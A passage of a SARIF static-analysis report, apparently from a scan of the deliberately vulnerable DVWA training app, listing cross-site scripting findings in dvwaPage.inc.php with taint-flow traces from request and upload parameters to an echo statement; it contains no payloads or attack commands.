        "text" : "In dvwaPage.inc.php, the program uses HTML, XML, or other types of encoding that is not always enough to prevent malicious code from reaching the web browser.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "994235208C1BDA4E79CC46B03DD19681"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/dvwaPage.inc.php"
          },
          "region" : {
            "startLine" : 345,
            "endLine" : 345,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - Read $_GET['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - Read $_GET['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - htmlspecialchars(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - Assignment to $name"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:12 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/impossible.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:4 - impossible.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/impossible.php"
                },
                "region" : {
                  "startLine" : 4
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:33 - impossible.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 33
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:53 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 53
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:66 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - Read $_GET['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - Read $_GET['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - htmlspecialchars(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - Assignment to $name"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:12 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/impossible.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:4 - impossible.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/impossible.php"
                },
                "region" : {
                  "startLine" : 4
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:34 - impossible.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:80 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 80
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:96 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 96
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - Read $_GET['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - Read $_GET['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - htmlspecialchars(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - Assignment to $name"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:12 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/impossible.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:4 - impossible.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/impossible.php"
                },
                "region" : {
                  "startLine" : 4
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - impossible.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:73 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 73
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:94 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 94
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - Read $_GET['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - Read $_GET['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - htmlspecialchars(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - Assignment to $name"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:12 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/impossible.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:4 - impossible.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/impossible.php"
                },
                "region" : {
                  "startLine" : 4
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - impossible.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:51 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 51
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:65 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 65
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - Read $_GET['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - Read $_GET['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - htmlspecialchars(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - Assignment to $name"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:12 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/impossible.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:4 - impossible.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/impossible.php"
                },
                "region" : {
                  "startLine" : 4
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:34 - impossible.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:67 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 67
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:80 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 80
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4615",
      "message" : {
        "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "9D445414CA34844F7CB10480C934DC27"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/dvwaPage.inc.php"
          },
          "region" : {
            "startLine" : 345,
            "endLine" : 345,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - Read $_FILES['uploaded']['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - Read $_FILES['uploaded']['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - Assignment to $uploaded_name"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:10 - substr(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:10 - Assignment to $uploaded_ext"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:18 - Assignment to $target_file"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 18
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:42 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 42
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:3 - impossible.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:33 - impossible.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 33
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:53 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 53
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:66 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - Read $_FILES['uploaded']['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - Read $_FILES['uploaded']['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - Assignment to $uploaded_name"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:10 - substr(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:10 - Assignment to $uploaded_ext"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:18 - Assignment to $target_file"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 18
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:42 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 42
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:3 - impossible.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:34 - impossible.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:80 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 80
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:96 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 96
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - Read $_FILES['uploaded']['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - Read $_FILES['uploaded']['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - Assignment to $uploaded_name"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:10 - substr(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:10 - Assignment to $uploaded_ext"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:18 - Assignment to $target_file"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 18
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:42 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 42
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:3 - impossible.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - impossible.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:73 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 73
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:94 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 94
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - Read $_FILES['uploaded']['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - Read $_FILES['uploaded']['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - Assignment to $uploaded_name"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:10 - substr(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:10 - Assignment to $uploaded_ext"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:18 - Assignment to $target_file"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 18
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:42 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 42
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:3 - impossible.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - impossible.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:51 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 51
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:65 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 65
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - Read $_FILES['uploaded']['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
